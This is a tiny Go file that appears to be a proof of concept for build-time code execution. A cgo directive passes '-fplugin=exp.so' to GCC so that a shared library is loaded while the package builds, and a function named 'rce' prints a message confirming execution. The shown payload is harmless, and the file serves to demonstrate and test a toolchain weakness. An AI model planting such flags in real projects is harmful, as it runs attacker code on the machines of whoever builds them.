package main

/*
#cgo linux CFLAGS: -fplugin=exp.so
void rce() {
  printf("Code Execution during build");
}
*/
import "C"

func main() {
	C.rce()
	return
}
